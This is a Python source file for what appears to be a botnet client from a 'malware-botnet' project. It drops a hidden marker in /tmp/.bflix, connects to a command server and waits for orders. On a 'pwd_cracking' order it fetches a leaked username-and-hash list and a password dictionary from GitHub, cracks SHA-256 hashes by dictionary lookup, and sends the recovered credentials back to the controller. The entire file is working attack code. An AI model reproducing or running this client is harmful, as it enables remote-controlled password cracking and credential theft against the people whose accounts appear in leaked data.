import socket
import json
from argparse import ArgumentParser
import os
import urllib.request as urll
from hashlib import sha256

def password_cracking(url_dictionary, url_filtered):
    # url_dictionary = "https://raw.githubusercontent.com/davidciria/malware-botnet/crack/Dictionary.txt"
    # url_filtered = "https://raw.githubusercontent.com/davidciria/malware-botnet/crack/Leaked2.txt"

    dictionary_data = urll.urlopen(url_dictionary).read().decode('utf-8')
    dictionary_data = dictionary_data.split("\n")

    filtered_data = urll.urlopen(url_filtered).read().decode('utf-8')
    filtered_data = filtered_data.split("\n")

    passwords_found = {}

    for linef in filtered_data:
        items = linef.split(":")
        user = items[0]
        hashed = items[1]
        
        for lined in dictionary_data:
            password_try = lined
            sha = sha256(password_try.encode("utf-8")).hexdigest()
            if hashed == sha:
                print("Password cracked: ", user, password_try)
                passwords_found[user] = password_try
                break
    return passwords_found

def crack_dict(file):
    leaked_link = "https://raw.githubusercontent.com/davidciria/malware-botnet/main/files/Leaked{}.txt".format(file)
    dict_link = "https://raw.githubusercontent.com/davidciria/malware-botnet/main/files/Dictionary.txt"

    passwords_found = password_cracking(dict_link, leaked_link)

    return passwords_found

def client_already_exists():
    path = "/tmp/.bflix/client.init"
    if os.path.isfile(path):
        return True
    else:
        return False

def client_initated():
    path = "/tmp/.bflix/client.init"
    if not os.path.isdir("/tmp/.bflix/"):
        os.mkdir("/tmp/.bflix/")
    file = open(path, "w")
    file.close()

if __name__ == '__main__':

    if not client_already_exists():

        parser = ArgumentParser()
        parser.add_argument("-p", "--port", default="9090", help="Port of the botnet server")
        parser.add_argument("-i", "--interface", default="localhost", help="IP of the botnet server")
        args = parser.parse_args()


        ClientMultiSocket = socket.socket()
        host = args.interface
        port = int(args.port)

        try:
            ClientMultiSocket.connect((host, port))
        except socket.error as e:
            print(str(e))

        client_initated() # Create a file to identify that the client is initiated for this host.
        while True:
            print("Connected to the server")
            print("Waiting for actions...")
            action = ClientMultiSocket.recv(1024)
            action_d = action.decode('utf-8')
            print("Action received: {}".format(action_d))
            if action_d == "connected":
                continue
            elif action_d == "pwd_cracking":
                ClientMultiSocket.send(str.encode("send_file"))
                file = ClientMultiSocket.recv(1024)
                passwords_found = crack_dict(file.decode('utf-8'))
                ClientMultiSocket.send(str.encode(json.dumps(passwords_found)))

        ClientMultiSocket.close()
    else:
        print("Client already initiated")